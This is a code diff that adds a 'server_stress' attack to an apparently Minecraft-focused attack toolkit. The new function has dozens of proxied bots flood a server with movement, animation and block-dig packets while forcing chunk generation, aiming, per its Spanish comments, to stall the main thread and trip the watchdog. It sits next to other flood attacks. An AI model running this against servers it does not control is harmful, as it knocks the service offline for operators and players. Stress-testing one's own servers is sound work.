@@ -115,11 +115,65 @@ export async function loginFlood(options = {}) {
   return { attack: 'login_flood', count, elapsedMs, outcomes: tally };
 }
 
+// 5. Estres del servidor: muchos bots concurrentes que entran, caminan hacia
+// zonas nuevas forzando generacion de chunks y spamean acciones. Busca saturar
+// el hilo principal (avisos "Can't keep up", y en el limite el watchdog de 60s).
+export async function serverStress(options = {}) {
+  const { host, port, version } = { ...DEFAULTS, ...options };
+  const bots = options.bots ?? 40;
+  const durationMs = (options.durationSec ?? 45) * 1000;
+  const stepBlocks = options.step ?? 6;       // pasos cortos y continuos
+  const deadline = Date.now() + durationMs;
+
+  let joined = 0;
+  let packets = 0;
+  const start = performance.now();
+
+  async function oneBot(index) {
+    const username = `stress_${index}_${Math.random().toString(36).slice(2, 6)}`;
+    const client = connectThroughProxy({ host, port, version, username });
+    client.on('error', () => {});
+    let alive = true;
+    client.once('end', () => { alive = false; });
+
+    try {
+      await awaitPlay(client, 25_000);
+    } catch {
+      return;
+    }
+    joined++;
+
+    const flags = { onGround: true, hasHorizontalCollision: false };
+    let x = (index - bots / 2) * 512;          // cada bot en una franja distinta
+    let z = 0;
+    // Bucle de carga: avanza y spamea hasta el tiempo limite.
+    while (alive && Date.now() < deadline) {
+      z += stepBlocks;
+      try {
+        client.write('position', { x, y: 80, z, flags });
+        client.write('arm_animation', { hand: 'main_hand' });
+        client.write('block_dig', { status: 0, location: { x: Math.floor(x), y: 79, z: Math.floor(z) }, face: 1, sequence: 0 });
+        packets += 3;
+      } catch {
+        break;
+      }
+      // ~20 iteraciones por segundo, como un cliente real a tope.
+      await new Promise(r => setTimeout(r, 50));
+    }
+    if (alive) client.end('fin del estres');
+  }
+
+  await Promise.all(Array.from({ length: bots }, (_, i) => oneBot(i)));
+  const elapsedMs = Math.round(performance.now() - start);
+  return { attack: 'server_stress', bots, joined, packets, elapsedMs, sent: packets };
+}
+
 export const ATTACKS = {
   packet_flood: packetFlood,
   impossible_movement: impossibleMovement,
   oversized_payload: oversizedPayload,
   login_flood: loginFlood,
+  server_stress: serverStress,
 };
 
 async function main() {
@@ -130,6 +184,9 @@ async function main() {
     port: { type: 'string', default: '25565' },
     version: { type: 'string', default: '26.1' },
     count: { type: 'string' },
+    bots: { type: 'string' },
+    duration: { type: 'string' },
+    step: { type: 'string' },
     help: { type: 'boolean', default: false },
   } });
 
@@ -148,6 +205,9 @@ async function main() {
 
   const options = { host: values.host, port: Number(values.port), version: values.version };
   if (values.count) options.count = Number(values.count);
+  if (values.bots) options.bots = Number(values.bots);
+  if (values.duration) options.durationSec = Number(values.duration);
+  if (values.step) options.step = Number(values.step);
 
   const summary = await run(options);
   process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
